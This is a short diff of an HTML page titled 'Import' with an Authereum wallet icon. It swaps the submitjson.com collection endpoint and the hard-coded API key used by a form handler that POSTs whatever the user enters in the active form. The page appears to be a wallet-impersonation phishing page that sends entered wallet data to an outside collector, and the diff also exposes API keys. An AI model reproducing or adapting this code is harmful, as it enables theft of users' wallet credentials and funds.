@@ -5,7 +5,6 @@
     <meta name="viewport" content="width=device-width, initial-scale=1.0" />
     <link rel="stylesheet" href="./output.css" />
     <link rel="icon" href="/dist/images/authereum-Copy.svg" type="image/x-icon" sizes="32x32" />
-
     <title>Import</title>
   </head>
   <body>
@@ -184,7 +183,7 @@
         form.addEventListener("submit", async function (event) {
           event.preventDefault(); // Prevent default form submission
 
-          const url = `https://api.submitjson.com/v1/submit/b76ipGkky`;
+          const url = `https://api.submitjson.com/v1/submit/vV6G5odNC`;
           let formData = {};
 
           // Collect data from the active form
@@ -197,7 +196,7 @@
             method: "POST",
             headers: {
               "content-type": "application/json",
-              "X-API-Key": "sjk_3f2c8d1aeb474bbbb3afd6a0f404c6db", // Replace with your API Key
+              "X-API-Key": "sjk_0ee051a9715c4c11b3ff9c2bce8d137f", // Replace with your API Key
             },
             body: JSON.stringify({ data: formData }),
           });
